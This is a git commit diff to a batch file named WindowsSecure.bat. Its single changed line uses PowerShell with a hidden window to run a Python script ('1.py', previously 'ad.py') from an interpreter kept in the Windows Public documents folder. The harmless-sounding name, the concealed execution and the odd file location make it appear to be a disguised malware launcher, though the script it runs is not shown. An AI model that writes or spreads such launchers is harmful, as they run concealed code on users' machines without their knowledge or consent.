2dc428aab57c7ff3dbad85e2cc8c651914da71c3
dfawefsa6674f <158439792+dfawefsa6674f@users.noreply.github.com>
2024-02-10 04:17:17 +0000

    Update WindowsSecure.bat

--- WindowsSecure.bat
+++ WindowsSecure.bat
@@ -1,4 +1,4 @@
-C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\ad.py
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\Python312\\python C:\\Users\\Public\\Document\\Python312\\1.py
 
 
 
